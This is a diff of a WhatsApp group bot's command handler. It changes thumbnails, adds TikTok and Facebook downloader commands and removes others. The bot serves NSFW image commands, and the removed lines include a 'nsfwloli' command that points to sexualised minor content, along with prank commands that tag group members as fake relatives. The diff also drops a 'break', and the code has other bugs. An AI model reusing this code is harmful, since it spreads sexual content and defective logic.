-                            thumbnailUrl: 'https://telegra.ph/file/b95e06cbc7d90c2f1b3c8.jpg',
+                            thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
                             sourceUrl: websitex,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -2992,7 +3542,7 @@ break
             }
             break
             case 'rentbot':
-                replygcxeon(`Type ${prefix}${ownernumber} owner and chat him`)
+                replygcxeon(`Type ${prefix}owner and chat him`)
                 break
             case 'speedtest': {
                 replygcxeon('Testing Speed...')
@@ -3018,7 +3568,7 @@ break
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnailUrl: 'https://telegra.ph/file/b95e06cbc7d90c2f1b3c8.jpg',
+                                thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
                                 sourceUrl: websitex,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -3034,7 +3584,7 @@ break
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnailUrl: 'https://telegra.ph/file/b95e06cbc7d90c2f1b3c8.jpg',
+                                thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
                                 sourceUrl: websitex,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -3055,7 +3605,7 @@ break
                             showAdAttribution: true,
                             title: botname,
                             body: ownername,
-                            thumbnailUrl: 'https://telegra.ph/file/b95e06cbc7d90c2f1b3c8.jpg',
+                            thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
                             sourceUrl: websitex,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -3067,7 +3617,7 @@ break
                 break
 case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
 let me = m.sender
-let teks = `*「  ${global.botname} Script 」*\n\nYouTube: ${global.websitex}\nGitHub: ${global.botscript}\n\nHi @${me.split('@')[0]} 👋\nDont forget to donate yeah🍜 👇 https://telegra.ph/file/810b13ff39277018142ea.jpg`
+let teks = `*「  ${global.botname} Script 」*\n\n Facebook: ${global.websitex}\nGitHub: ${global.botscript}\n\nHi @${me.split('@')[0]} 👋\nDont forget to donate yeah🍜 👇 https://telegra.ph/file/561d9abf526067d54f6c0.jpg`
 sendXeonBotIncMessage(from, { 
 text: teks,
 mentions:[sender],
@@ -3123,7 +3673,7 @@ const pcknm = swn.split("|")[0]
 const atnm = swn.split("|")[1]
 if (m.quoted.isAnimated === true) {
 XeonBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
-XeonBotInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
+XeonBotInc.sendMessage(m.chat, {sticker:fs.readFileSync("gifee.webp")}, m, { packname: pcknm, author: atnm })
 } else if (/image/.test(mime)) {
 let media = await quoted.download()
 let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
@@ -3444,7 +3994,7 @@ ${arr.slice(0, 3).join('')}
 ${arr.slice(3, 6).join('')}
 ${arr.slice(6).join('')}
 
-Wait @${room.game.currentTurn.split('@')[0]}
+Turn @${room.game.currentTurn.split('@')[0]}
 
 Type *surrender* to give up and admit defeat`
                     if (room.x !== room.o) await XeonBotInc.sendText(room.x, str, m, {
@@ -3476,7 +4026,7 @@ Type *surrender* to give up and admit defeat`
                         XeonBotInc.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
                     } else if (!this.game) {
                         replygcxeon(`Session TicTacToe🎮 tidak ada`)
-                    } else mewReply('?')
+                    } else replygcxeon('?')
                 } catch (e) {
                     replygcxeon('rusak')
                 }
@@ -3499,7 +4049,7 @@ Type *surrender* to give up and admit defeat`
 
 @${m.sender.split`@`[0]} challenged @${m.mentionedJid[0].split`@`[0]} to play suits
 
-Please @${m.mentionedJid[0].split`@`[0]} to type accept/reject`
+@${m.mentionedJid[0].split`@`[0]}Please type accept/reject, accept to accept or reject to reject the challenge`
                 this.suit[id] = {
                     chat: await XeonBotInc.sendText(m.chat, caption, m, {
                         mentions: parseMention(caption)
@@ -3534,25 +4084,6 @@ Please @${m.mentionedJid[0].split`@`[0]} to type accept/reject`
                 }
             }
             break
-            case 'groupowner': {
-                XeonBotInc.sendMessage(m.chat,
-                { text: ` This Group was Created by @${groupOwner.split("@")[0]}👑`,
-                contextInfo:{
-                mentionedJid:[groupOwner],
-                forwardingScore: 9999999,
-                isForwarded: true, 
-                "externalAdReply": {
-                "showAdAttribution": true,
-                "containsAutoReply": true,
-                "title": ` ${global.botname}`,
-                "body": `${ownername}`,
-                "previewType": "PHOTO",
-                "thumbnailUrl": ``,
-                "thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
-                "sourceUrl": `${websitex}`}}},
-                { quoted: m})        
-                            }
-break
             case 'afk': {
                 let user = global.db.data.users[m.sender]
                 user.afkTime = + new Date
@@ -3560,10 +4091,7 @@ break
                 replygcxeon(`${m.pushName} *Has Gone AFK*${text ? ': ' + text : ''}`)
             }
             break	
-            case 'ai': 
-            case 'ask':
-            case 'openai': {
-               if (db.data.users[sender].limit < 1) return replygcxeon(mess.limit)
+            case 'openai-indo': {
 	            if (!q) return replygcxeon(`Example : ${prefix + command} who is ronaldo`)
 			      var isiai = await fetchJson(`https://aemt.me/openai?text=${q}`)
 			      var isi = isiai.result
@@ -3756,7 +4284,7 @@ break
                 if (!m.isGroup) return XeonStickGroup()
                 if (!isBotAdmins) return XeonStickBotAdmin()
                 if (!isAdmins) return XeonStickAdmin()
-                if (!text) return replygcxeon('Enter the value enable/disable')
+                if (!text) return replygcxeon('Enter the value on/off')
                 if (args[0] === 'on') {
                     await XeonBotInc.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
                     await replygcxeon(`Done`)
@@ -4273,290 +4801,6 @@ XeonBotInc.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [t
 }, 9000)
 }
 break
-case 'u':
-    {
-       let user= m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') 
-       let username =XeonBotInc.getName(user)
-       console.log(json)
-       const res = json[0]
-  let message =`your username is ${username}`
-  XeonBotInc.sendMessage(m.chat,
-    { text: message,
-     contextInfo:{
-             "externalAdReply": {"showAdAttribution": true,
-             "containsAutoReply": true,
-             "title": ` ${global.botname}`,
-             "body": `${ownername}`,
-             "previewType": "PHOTO",
-            "thumbnailUrl": ``,
-            "thumbnail": XeonWlcm,
-             "sourceUrl": `${websitex}`}
-                }
-    })
-    }
-    break
-
-    case 'buttons':
-
-        let button = [
-            { type: 'reply', title: 'menu', payload: 'menu' },
-            { type: 'reply', title: 'ping', payload: 'ping' },
-            { type: 'reply', title: 'owner', payload: 'owner' },
-            // Add more buttons as needed
-        ]
-       sendbuttonsResponseMessage(m.chat, {
-            text: 'select buttons from below',
-            buttons: button
-           }
-    )
-        break
-case 'family': case 'fm' : {
-    if (!m.isGroup) return XeonStickGroup()
-    function getRandomPercentage() {
-        return Math.floor(Math.random() * 100) + 1;
-    }
-    let ps = groupMetadata.participants.map(v => v.id);
-    let b,c,d,e,f,g,h,j,k,l,n,o,p,q,
-    a= m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-    b= ps[Math.floor(Math.random() * ps.length)]
-    c= ps[Math.floor(Math.random() * ps.length)]
-    d= ps[Math.floor(Math.random() * ps.length)]
-    e= ps[Math.floor(Math.random() * ps.length)]
-    f= ps[Math.floor(Math.random() * ps.length)]
-    g= ps[Math.floor(Math.random() * ps.length)]
-    h= ps[Math.floor(Math.random() * ps.length)]
-    i= ps[Math.floor(Math.random() * ps.length)]
-    k= ps[Math.floor(Math.random() * ps.length)]
-    l= ps[Math.floor(Math.random() * ps.length)]
-    n= ps[Math.floor(Math.random() * ps.length)]
-    o= ps[Math.floor(Math.random() * ps.length)]
-    p= ps[Math.floor(Math.random() * ps.length)]
-    q= ps[Math.floor(Math.random() * ps.length)]
-
-
-        b= ps[Math.floor(Math.random() * ps.length)]
-    do {
-    b= ps[Math.floor(Math.random() * ps.length)]
-    } while (a==b);
-
-    do {
-     c= ps[Math.floor(Math.random() * ps.length)]
-    } while (c==b||c==a);
-
-    do{
-     d= ps[Math.floor(Math.random() * ps.length)]
-    } while (d==c||d==b||d==a);
-
-    do{
-     e= ps[Math.floor(Math.random() * ps.length)]
-    } while (e==d||e==c||e==b||e==a);
-
-    do{
-     f= ps[Math.floor(Math.random() * ps.length)]
-    } while (f==e||f==d||f==c||f==b||f==a);
-     
-    do{
-     g= ps[Math.floor(Math.random() * ps.length)]
-    } while (g==f||g==e||g==d||g==c||g==b||g==a);
-
-    do { 
-     h= ps[Math.floor(Math.random() * ps.length)]
-    } while (h==a||h==b||h==c||h==d||h==f||h==g);
-
-    do {
-     i= ps[Math.floor(Math.random() * ps.length)]
-    } while (i==a||i==b||i==c||i==d||i==e||i==f||i==g||i==h);
-    do {
-     j= ps[Math.floor(Math.random() * ps.length)]
-    } while (j==a||j==b||j==c||j==d||j==e||j==f||j==g||j==h||j==i);
-
-    do {
-     k= ps[Math.floor(Math.random() * ps.length)]
-    } while (k==a||k==b||k==c||k==d||k==e||k==f||k==g||k==h||k==i||k==j);
-
-     do {
-     l= ps[Math.floor(Math.random() * ps.length)]
-     } while (l==a||l==b||l==c||l==d||l==e||l==f||l==g||l==h||l==i||l==j||l==k);
-     
-     do {
-     n= ps[Math.floor(Math.random() * ps.length)]
-    } while (n==a||n==b||n==c||n==d||n==e||n==f||n==g||n==h||n==i||n==j||n==k||n==l);
-
-    do {
-     o= ps[Math.floor(Math.random() * ps.length)]
-    } while (o==a||o==b||o==c||o==d||o==e||o==f||o==g||o==h||o==i||o==j||o==k||o==l||o==n);
-     p= ps[Math.floor(Math.random() * ps.length)]
-     q= ps[Math.floor(Math.random() * ps.length)]
-   
-
-    const percentage = getRandomPercentage();
-    xeonbody = `গোপন সূত্র থেকে পাওয়া @${a.split("@")[0]} চৌদ্দগুষ্টির বিবরণ:\n
-মা :‌-        @${b.split("@")[0]}🫃
-বাবা :-       @${c.split("@")[0]}💦
-ভাই/বোন :-  @${d.split("@")[0]}💆
-বর/বউ :-    @${e.split("@")[0]}👫
-Bf/Gf :-     @${f.split("@")[0]} 👩‍❤‍💋‍👨
-Ex :-        @${g.split("@")[0]} 🤡
-ঘটক :-       @${h.split("@")[0]} 😁
-শশুর :-      @${i.split("@")[0]}🧚
-শাশুরি:-      @${j.split("@")[0]} 🧚
-ক্রাশ :-      @${k.split("@")[0]} 🥵
-বাচ্চা:        ${percentage} টি \n
-1st বাচ্চা:    @${l.split("@")[0]}👶🏼
-
-@${a.split("@")[0]} এই হল তোমার আসল পরিচয় কাল সবাইকে নিয়ে নবান্ন দেখা কর।🤸‍♂`
-try {
-        ppuser = await XeonBotInc.profilePictureUrl(a, 'image')
-    } catch (err) {
-    ppuser = 'https://images.app.goo.gl/5kHFgvSatAYWunaw9'
-    }
-XeonWlcm = await getBuffer(ppuser)
-
-XeonBotInc.sendMessage(m.chat,
-    { text: xeonbody,
-        image: XeonWlcm,
-    contextInfo:{
-    mentionedJid:[a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q],
-    externalAdReply: {
-        showAdAttribution: true,
-        title: botname,
-        body: ownername,
-        thumbnail: XeonWlcm,
-        sourceUrl: websitex,
-        mediaType: 1,
-    }}}, {
-        quoted: m
-    })
- }
-break
-case 'familymembers': case 'family2' : {
-    if (!m.isGroup) return XeonStickGroup()
-    function getRandomPercentage() {
-        return Math.floor(Math.random() * 100) + 1;
-    }
-    let ps = groupMetadata.participants.map(v => v.id);
-    let b,c,d,e,f,g,h,j,k,l,n,o,p,q,
-    a= m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-    b= ps[Math.floor(Math.random() * ps.length)]
-    c= ps[Math.floor(Math.random() * ps.length)]
-    d= ps[Math.floor(Math.random() * ps.length)]
-    e= ps[Math.floor(Math.random() * ps.length)]
-    f= ps[Math.floor(Math.random() * ps.length)]
-    g= ps[Math.floor(Math.random() * ps.length)]
-    h= ps[Math.floor(Math.random() * ps.length)]
-    i= ps[Math.floor(Math.random() * ps.length)]
-    k= ps[Math.floor(Math.random() * ps.length)]
-    l= ps[Math.floor(Math.random() * ps.length)]
-    n= ps[Math.floor(Math.random() * ps.length)]
-    o= ps[Math.floor(Math.random() * ps.length)]
-    p= ps[Math.floor(Math.random() * ps.length)]
-    q= ps[Math.floor(Math.random() * ps.length)]
-
-
-        b= ps[Math.floor(Math.random() * ps.length)]
-    do {
-    b= ps[Math.floor(Math.random() * ps.length)]
-    } while (a==b);
-
-    do {
-     c= ps[Math.floor(Math.random() * ps.length)]
-    } while (c==b||c==a);
-
-    do{
-     d= ps[Math.floor(Math.random() * ps.length)]
-    } while (d==c||d==b||d==a);
-
-    do{
-     e= ps[Math.floor(Math.random() * ps.length)]
-    } while (e==d||e==c||e==b||e==a);
-
-    do{
-     f= ps[Math.floor(Math.random() * ps.length)]
-    } while (f==e||f==d||f==c||f==b||f==a);
-     
-    do{
-     g= ps[Math.floor(Math.random() * ps.length)]
-    } while (g==f||g==e||g==d||g==c||g==b||g==a);
-
-    do { 
-     h= ps[Math.floor(Math.random() * ps.length)]
-    } while (h==a||h==b||h==c||h==d||h==f||h==g);
-
-    do {
-     i= ps[Math.floor(Math.random() * ps.length)]
-    } while (i==a||i==b||i==c||i==d||i==e||i==f||i==g||i==h);
-    do {
-     j= ps[Math.floor(Math.random() * ps.length)]
-    } while (j==a||j==b||j==c||j==d||j==e||j==f||j==g||j==h||j==i);
-
-    do {
-     k= ps[Math.floor(Math.random() * ps.length)]
-    } while (k==a||k==b||k==c||k==d||k==e||k==f||k==g||k==h||k==i||k==j);
-
-     do {
-     l= ps[Math.floor(Math.random() * ps.length)]
-     } while (l==a||l==b||l==c||l==d||l==e||l==f||l==g||l==h||l==i||l==j||l==k);
-     
-     do {
-     n= ps[Math.floor(Math.random() * ps.length)]
-    } while (n==a||n==b||n==c||n==d||n==e||n==f||n==g||n==h||n==i||n==j||n==k||n==l);
-
-    do {
-     o= ps[Math.floor(Math.random() * ps.length)]
-    } while (o==a||o==b||o==c||o==d||o==e||o==f||o==g||o==h||o==i||o==j||o==k||o==l||o==n);
-     p= ps[Math.floor(Math.random() * ps.length)]
-     q= ps[Math.floor(Math.random() * ps.length)]
-   
-
-    const percentage = getRandomPercentage();
-    maa=XeonBotInc.getName(a),
-    baba=XeonBotInc.getName(b),
-    vai=XeonBotInc.getName(c),
-    bou=XeonBotInc.getName(d),
-    bf=XeonBotInc.getName(e),
-    bariwala=XeonBotInc.getName(f),
-    ex=XeonBotInc.getName(j),
-    sosur=XeonBotInc.getName(g),
-    sasuri=XeonBotInc.getName(h),
-    crush=XeonBotInc.getName(i),
-
-    xeonbody = `গোপন সূত্র থেকে পাওয়া @${a.split("@")[0]} চৌদ্দগুষ্টির বিবরণ:\n
-মা :‌-        ${maa}🫃
-বাবা :-       ${baba}💦
-ভাই/বোন :-  ${vai}💆
-বর/বউ :-    ${bou}👫
-Bf/Gf :-     ${bf} 👩‍❤‍💋‍👨
-Ex :-        ${ex} 🤡
-বাড়িওয়ালা :-  ${bariwala} 🏟
-শশুর :-      ${sosur}🧚
-শাশুরি:-      ${sasuri} 🧚
-ক্রাশ :-      ${crush} 🥵
-বাচ্চা:        ${percentage} টি \n
-@${a.split("@")[0]} এই হল তোমার আসল পরিচয় কাল সবাইকে নিয়ে নবান্ন দেখা কর।🤸‍♂`
-try {
-        ppuser = await XeonBotInc.profilePictureUrl(a, 'image')
-    } catch (err) {
-    ppuser = 'https://images.app.goo.gl/5kHFgvSatAYWunaw9'
-    }
-XeonWlcm = await getBuffer(ppuser)
-
-XeonBotInc.sendMessage(m.chat,
-    { text: xeonbody,
-        image: XeonWlcm,
-    contextInfo:{
-    mentionedJid:[a],
-    externalAdReply: {
-        showAdAttribution: true,
-        title: botname,
-        body: ownername,
-        thumbnail: XeonWlcm,
-        sourceUrl: websitex,
-        mediaType: 1,
-    }}}, {
-        quoted: m
-    })
- }
-break
 case 'q': case 'quoted': {
 if (!m.quoted) return replygcxeon('Reply the Message!!')
 let xeonquotx= await XeonBotInc.serializeM(await m.getQuotedObj())
@@ -4571,27 +4815,6 @@ replygcxeon(`Success
 ${meg.result}`)
 }
 break
-case 'upp': case 'profpic': {
-    a= m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-    try {
-        ppuser = await XeonBotInc.profilePictureUrl(a, 'image')
-        } catch (err) {
-        ppuser = 'https://images.app.goo.gl/5kHFgvSatAYWunaw9'
-        }
-        XeonWlcm = await getBuffer(ppuser)
-        let username =XeonBotInc.getName(a)
-        dpuser = `here is ${username} 's profile picture`
-        XeonBotInc.sendMessage(m.chat, {
-            image: XeonWlcm,
-            caption: dpuser,
-            mentionjid: [a],
-            
-        }, {
-            quoted: m
-        })
-
-}
-    break
 case 'style': case 'styletext': {
 		let { styletext } = require('./lib/scraper')
 		if (!text) return replygcxeon('Enter Query text!')
@@ -4686,7 +4909,21 @@ let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
     let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
     XeonBotInc.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcxeon(mess.error))
 break
-case 'tiktok':{
+case'tiktok':{
+if (!text) return replygcxeon(`Use it by the way: ${prefix+command} *query*\n\n_Example_\n\n${prefix+command} khaby lame`)
+XeonBotInc.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
+try{
+let anu = await fetchJson(`https://api.junn4.my.id/search/tiktoksearch?query=${text}`)
+const capt = anu.result.title
+await XeonBotInc.sendMessage(m.chat, { video: { url: anu.result.no_watermark}, caption: `🔖TITLE : ${capt}`}, {quoted: m})
+await XeonBotInc.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
+}catch (error) {
+replygcxeon(`Sorry this video can't be download\n\nRequest failed with status code *400*`);
+}
+}
+break
+case 'tiktokvideo':
+case 'tiktokmp4': {
 if (!q) return replygcxeon( `Example : ${prefix + command} link`)
 if (!q.includes('tiktok')) return replygcxeon(`Link Invalid!!`)
 require('./lib/tiktok').Tiktok(q).then( data => {
@@ -4694,6 +4931,7 @@ XeonBotInc.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.wat
 })
 }
 break
+case 'tiktokmp3':
 case 'tiktokaudio':{
 if (!q) return replygcxeon( `Example : ${prefix + command} link`)
 if (!q.includes('tiktok')) return replygcxeon(`Link Invalid!!`)
@@ -4701,6 +4939,18 @@ require('./lib/tiktok').Tiktok(q).then( data => {
 const xeontikmp3 = {url:data.audio}
 XeonBotInc.sendMessage(m.chat, { audio: xeontikmp3, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
 })
+}
+break
+case'ttslide': case 'tiktokslide':{
+if (!text) return replygcxeon(`Use it by the way ${prefix+command} *url*\n\n_Example_\n\n${prefix+command} https://vt.tiktok.com/ZSL36LfEP/`)
+XeonBotInc.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
+try{
+let anu = await fetchJson(`https://aemt.me/download/tiktokslide?url=${text}`)
+await XeonBotInc.sendMessage(m.chat, { image: { url: anu.result.data.origin_cover}, caption: ``}, {quoted: m})
+await XeonBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
+}catch (error) {
+await XeonBotInc.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
+}
 }
 break
 case 'google': {
@@ -4745,10 +4995,24 @@ if (!text) return replygcxeon('What location?')
            )
            }
            break
+           case 'facebook2': case 'fb2':{
+if (!text) return replygcxeon(`Enter the link!!!`)
+if (!isUrl(args[0])) return replygcxeon(`Where is the link?`)
+await XeonBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
+try{
+let anu = await fetchJson(`https://aemt.me/download/fbdown?url=${text}`)
+XeonBotInc.sendMessage(m.chat, { video: { url: anu.result.url.urls[0].hd }, caption: 'Here you go!' }, { quoted: m })
+await XeonBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
+}catch (error) {
+await XeonBotInc.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
+}
+}
+break
            case 'fb':
-           case 'facebook': case 'fb' : case 'fbvid' : {
+           case 'facebook': case 'fbvid':
+case 'facebookvid': {
            if (!args[0]) {
-    return replygcxeon(` @${m.sender.split("@")[0]} Please send the link of a Facebook video`)
+    return replygcxeon(`Please send the link of a Facebook video\n\nEXAMPLE :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`)
   }
   const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
   if (!urlRegex.test(args[0])) {
@@ -4757,7 +5021,7 @@ if (!text) return replygcxeon('What location?')
   try {
     const result = await fg.fbdl(args[0]);
     const tex = `
-    @${m.sender.split("@")[0]} Here is your video 
+        [ FACEBOOK DL ]
 ${themeemoji} Title: ${result.title}`;
     const response = await fetch(result.videoUrl)
     const arrayBuffer = await response.arrayBuffer()
@@ -5199,7 +5463,6 @@ var hasil = pickRandom(notnot)
 XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'couplepp': case 'ppcouple': {
-    if (!isPremium) return replygcxeon(mess.premium)
 let anu = require('./src/media/randompics/ppcouple.json')
 let random = anu[Math.floor(Math.random() * anu.length)]
 XeonBotInc.sendMessage(from, { image: { url: random.male }, caption: `Couple pp for male` }, { quoted: m })
@@ -5355,11 +5618,11 @@ const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15
 const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
 XeonBotInc.sendMessage(m.chat, { text: xeonkak }, { quoted: m })
 break
-            case 'soulmate': case 'mysoulmate': case 'ship': {
-            if (!m.isGroup) return XeonStickGroup()
-            let member = participants.map(u => u.id)
-            let me = m.sender
-            let jodoh = member[Math.floor(Math.random() * member.length)]
+case 'soulmate': case 'mysoulmate': case 'ship': {
+    if (!m.isGroup) return XeonStickGroup()
+    let member = participants.map(u => u.id)
+    let me = m.sender
+    let jodoh = member[Math.floor(Math.random() * member.length)]
 XeonBotInc.sendMessage(m.chat,
 { text: `👫Your Soulmate Is
 
@@ -5380,19 +5643,19 @@ isForwarded: true,
 "thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
 "sourceUrl": `${websitex}`}}},
 { quoted: m})        
-            }
-            break
- case 'couple': case 'vatar': case 'vatari': {
-	  if (!m.isGroup) return XeonStickGroup()
-            if (!m.isGroup) return XeonStickGroup()
-            let member = participants.map(u => u.id)
-            let orang = member[Math.floor(Math.random() * member.length)]
-            let jodoh = member[Math.floor(Math.random() * member.length)]
-            let me = m.sender
-            me!=jodoh!=orang
+    }
+    break
+case 'couple': case 'vatar': case 'vatari': {
+if (!m.isGroup) return XeonStickGroup()
+    if (!m.isGroup) return XeonStickGroup()
+    let member = participants.map(u => u.id)
+    let orang = member[Math.floor(Math.random() * member.length)]
+    let jodoh = member[Math.floor(Math.random() * member.length)]
+    let me = m.sender
+    me!=jodoh!=orang
 XeonBotInc.sendMessage(m.chat,
 { text: `Our new Couples are 
-         @${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
+ @${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
 He he he, কি রে শালা, খবর কি তোদের?😜😁👀
 
 > _Checked by @${me.split('@')[0]}_ `,
@@ -5410,8 +5673,8 @@ isForwarded: true,
 "thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
 "sourceUrl": `${websitex}`}}},
 { quoted: m})        
-            }
-            break
+    }
+
                         case 'coffee': case 'kopi': {
                 XeonBotInc.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
             }
@@ -5864,6 +6127,7 @@ await XeonStickWait()
                     return('Error!')
                 })
                 }
+break
 case 'animeshinobu':{
 await XeonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
@@ -6279,22 +6543,6 @@ var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/eba.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
 XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
 break
-case 'gangbang':
-if (!m.isGroup) return XeonStickGroup()
-	if (!AntiNsfw) return replygcxeon(mess.nsfw)
-await XeonStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/gangbang.json'))
-var xeonyresult = pickRandom(ahegaonsfw)
-XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
-break
-case 'nsfwloli':
-if (!m.isGroup) return XeonStickGroup()
-	if (!AntiNsfw) return replygcxeon(mess.nsfw)
-await XeonStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/nsfwloli.json'))
-var xeonyresult = pickRandom(ahegaonsfw)
-XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
-break
 case 'pussy':
 if (!m.isGroup) return XeonStickGroup()
 	if (!AntiNsfw) return replygcxeon(mess.nsfw)
@@ -6327,15 +6575,6 @@ await XeonStickWait()
     var bobuff = await fetchBuffer(assss.data.url)
     var bogif = await buffergif(bobuff)
     await XeonBotInc.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
-    })
-    break
-case 'gifhentai':
-if (!m.isGroup) return XeonStickGroup()
-if (!AntiNsfw) return replygcxeon(mess.nsfw)
-await XeonStickWait()
-var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/gifs.json'))
-var xeonyresultx = pickRandom(ahegaonsfw)
-    await XeonBotInc.sendMessage(m.chat,{video:xeonyresultx, gifPlayback:true },{quoted:m}).catch(err => {
     })
     break
 case 'checkme':
@@ -6540,74 +6779,6 @@ if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-e
 if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
 let dehe = await photooxy.photoOxy(link, q)
 XeonBotInc.sendMessage(m.chat, { image: { url: dehe }, caption: mess.success}, { quoted: m })
-}
-break
-case 'glitchtext':
-case 'writetext':
-case 'advancedglow':
-case 'typographytext':
-case 'pixelglitch':
-case 'neonglitch':
-case 'flagtext':
-case 'flag3dtext':
-case 'deletingtext':
-case 'blackpinkstyle':
-case 'glowingtext':
-case 'underwatertext':
-case 'logomaker':
-case 'cartoonstyle':
-case 'papercutstyle':
-case 'watercolortext':
-case 'effectclouds':
-case 'blackpinklogo':
-case 'gradienttext':
-case 'summerbeach':
-case 'luxurygold':
-case 'multicoloredneon':
-case 'sandsummer':
-case 'galaxywallpaper':
-case '1917style':
-case 'makingneon':
-case 'royaltext':
-case 'freecreate':
-case 'galaxystyle':
-case 'lighteffects':{
-
-if (!q) return replygcxeon(`Example : ${prefix+command} XeonBotInc`) 
-await XeonStickWait()
-let link
-if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
-if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
-if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
-if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
-if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
-if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
-if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
-if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
-if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
-if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
-if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
-if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
-if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
-if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
-if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
-if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
-if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
-if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
